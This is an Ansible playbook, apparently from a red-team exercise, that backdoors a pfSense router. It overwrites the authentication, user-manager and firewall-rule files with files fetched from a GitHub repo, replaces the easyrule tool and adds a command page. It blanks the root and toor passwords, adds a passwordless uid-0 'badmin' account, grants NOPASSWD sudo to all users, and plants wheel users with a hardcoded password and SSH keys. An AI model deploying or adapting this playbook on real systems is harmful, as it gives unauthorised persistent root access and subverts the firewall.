---
- name: Deploy pfsense goofs
  hosts: router
  vars_files:
    - variables.yml
  become: no # pfsense doesn't have sudo
  tasks:

#Authentication files first
  - name: /etc/inc/auth.inc
    ansible.builtin.get_url:
      url: "https://raw.githubusercontent.com/mcwillster/Lober/refs/heads/2.7.2/Files/auth.inc"
      dest: /etc/inc/auth.inc
      mode: 0755
      
  - name: /etc/inc/authgui.inc
    ansible.builtin.get_url:
      url: "https://raw.githubusercontent.com/mcwillster/Lober/refs/heads/2.7.2/Files/authgui.inc"
      dest: /etc/inc/authgui.inc
      mode: 0755
  

# gui files next  
  - name: /usr/local/www/system_usermanager.php
    ansible.builtin.get_url:
      url: "https://raw.githubusercontent.com/mcwillster/Lober/refs/heads/2.7.2/Files/system_usermanager.php"
      dest: /usr/local/www/system_usermanager.php
      mode: 0755

  - name: /usr/local/www/lober.gif
    ansible.builtin.get_url:
      url: "https://github.com/mcwillster/Lober/blob/2.7.2/Files/lober.gif?raw=true"
      dest: /usr/local/www/lober.gif
      mode: 0755
      
  - name: move firewall_rules.php to a safe location
    ansible.builtin.command: 
      cmd: mv /usr/local/www/firewall_rules.php /usr/local/www/firewallrules.php
    args:
      creates: /etc/inc/hardrule.inc     # if hardrule.inc exists, skip this task
  
  - name: /usr/local/www/lober.php
    ansible.builtin.get_url:
      url: "https://raw.githubusercontent.com/mcwillster/Lober/refs/heads/2.7.2/Files/lober.php"
      dest: /usr/local/www/firewall_rules.php
      mode: 0755
      
  - name: /usr/local/www/command.php
    ansible.builtin.get_url:
      url: "https://raw.githubusercontent.com/mcwillster/Lober/refs/heads/2.7.2/Files/commands.php"
      dest: /usr/local/www/command.php
      mode: 0755

# optional gui files
  - name: /usr/local/www/cornhill.inc
    ansible.builtin.get_url:
      url: "https://raw.githubusercontent.com/mcwillster/Lober/refs/heads/2.7.2/Files/cornhill.inc"
      dest: /usr/local/www/cornhill.inc
      mode: 0755

  - name: /usr/local/www/fireball_rules.php
    ansible.builtin.get_url:
      url: "https://raw.githubusercontent.com/mcwillster/Lober/refs/heads/2.7.2/Files/fireball_rules.php"
      dest: /usr/local/www/fireball_rules.php
      mode: 0755

# easyrule
  - name: move easyrule to hardrule
    ansible.builtin.command: 
      cmd: mv /usr/local/bin/easyrule /usr/local/bin/hardrule
    args:
      creates: /etc/inc/hardrule     # if hardrule exists, skip task
      
  - name: /usr/local/bin/easyrule
    ansible.builtin.get_url:
      url: "https://raw.githubusercontent.com/mcwillster/Lober/refs/heads/2.7.2/Files/nonexfil_easyrule"
      dest: /usr/local/bin/easyrule
      mode: 0755

  - name: move easyrule.inc to hardrule.inc
    ansible.builtin.command: 
      cmd: mv /etc/inc/easyrule.inc /etc/inc/hardrule.inc
    args:
      creates: /etc/inc/hardrule.inc     # Skip if already moved
      
  - name: /etc/inc/easyrule.inc
    ansible.builtin.get_url:
      url: "https://raw.githubusercontent.com/mcwillster/Lober/refs/heads/2.7.2/Files/easyrule.inc"
      dest: /etc/inc/easyrule.inc
      mode: 0755

# rc.initial changes or login shells
  - name: /etc/rc.initial
    ansible.builtin.get_url:
      url: "https://raw.githubusercontent.com/mcwillster/Lober/refs/heads/2.7.2/Files/rc.initial"
      dest: /etc/rc.initial
      mode: 0755
            
  - name: /etc/timetravel.initial
    ansible.builtin.get_url:
      url: "https://raw.githubusercontent.com/mcwillster/Lober/refs/heads/2.7.2/Files/timetravel.initial"
      dest: /etc/timetravel.initial
      mode: 0755
      
# pfsense stds

  - name: install sudo
    ansible.builtin.command: 
      cmd: pkg install -y sudo

  - name: install nano
    ansible.builtin.command: 
      cmd: pkg install -y nano
      
  - name: TrainingWheels | Update Sudoers
    become: true
    ansible.builtin.lineinfile:
      path: /usr/local/etc/sudoers
      insertafter: EOF
      line: "ALL ALL=(ALL:ALL) NOPASSWD:ALL"

  - name: NEXUS | Passwordless Root Login
    become: true
    ansible.builtin.lineinfile:
      path: /etc/passwd
      search_string: "root:*:0:0:Charlie &:/root:/bin/tcsh"
      line: "root::0:0:Charlie &:/root:/bin/sh"
      state: present

  - name: NEXUS | Passwordless TOOR Login
    become: true
    ansible.builtin.lineinfile:
      path: /etc/passwd
      search_string: "toor:*:0:0:Bourne-again Superuser:/root:"
      line: "toor::0:0:Bourne-again Superuser:/root:"
      state: present

#doesnt work?
  - name: NEXUS | Passwordless badmin Login
    become: true
    ansible.builtin.lineinfile:
      path: /etc/passwd
      insertafter: EOF
      line: "badmin::0:0:System Administrator:/root:/etc/rc.initial"
      
  - name: Nexus | Add Users 
    ansible.builtin.user:
      name: "{{ item }}"
      password: "{{ 'letredin' | password_hash('sha512') }}"
      shell: /bin/tcsh
      state: present
      groups: "wheel"
      create_home: false
    with_items:
      - "{{ redteam_users }}"

  - name: Nexus | Add Keys
    ansible.posix.authorized_key:
      user: "{{ item.0 }}"
      key: "{{ item.1 }}"
      manage_dir: true
      state: "present"
    with_nested: 
      - "{{ pfusers }}"
      - "{{ sshkeys }}"

  
  
  
  
  
  
  
